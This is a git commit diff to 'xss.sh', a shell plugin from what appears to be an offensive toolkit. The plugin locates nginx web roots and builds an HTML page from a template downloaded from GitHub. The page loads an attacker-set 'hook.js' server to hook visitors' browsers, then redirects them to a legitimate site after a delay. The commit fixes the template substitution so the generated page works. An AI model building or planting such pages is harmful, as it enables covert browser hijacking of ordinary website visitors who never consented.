e383bbad75b5d100aa08541d00b6e5a7bcc4e0e7
root <root@localhost.localdomain>
2019-04-23 08:36:19 -0400

    fix bug

--- plugins/xss.sh
+++ plugins/xss.sh
@@ -1,21 +1,22 @@
 gglog "load xss-html gen a xss html"
 xss-html(){
   gglog "searching nginx's configi...."
-  grep -nr "root" /etc/  | grep nginx
-  gglog "set jump to url: default www.google.com [Enter/url] "
+  grep -nr "root" /etc/  | grep nginx | grep www
+  echo -ne "set jump to url: default www.google.com [Enter/url] $UNDERLINE"
   read gourl;
   if [[ $gourl == "" ]]; then
 	  gourl="www.google.com";
   fi
-  gglog "set hook.js 's ip: default: localhost:3000 [Enter/ip:port]"
+  echo -ne "$REST set hook.js 's ip: default: localhost:3000 [Enter/ip:port]$UNDERLINE"
   read ip;
   if [[ $ip == "" ]]; then
 	  ip="localhost:3000";
   fi
-  gglog "set how many sec to delay then jumt real site default: 3 [Enter/int] "
+  echo -ne  "$REST set how many sec to delay then jumt real site default: 3 [Enter/int] $UNDERLINE"
   read sec;
   if [[ $sec == "" ]]; then
 	  sec="3";
   fi
-  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  echo "s/{sec}/$(echo $ip | xargs)/g; s/{gourl}/$(echo $gourl | xargs)/g; s/{ip}/$(echo $ip| xargs)/g "
+  gglog "to download template and render..."
+  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  sed "s/{sec}/$sec/g; s/{gourl}/$gourl/g; s/{ip}/$ip/g " -
 }
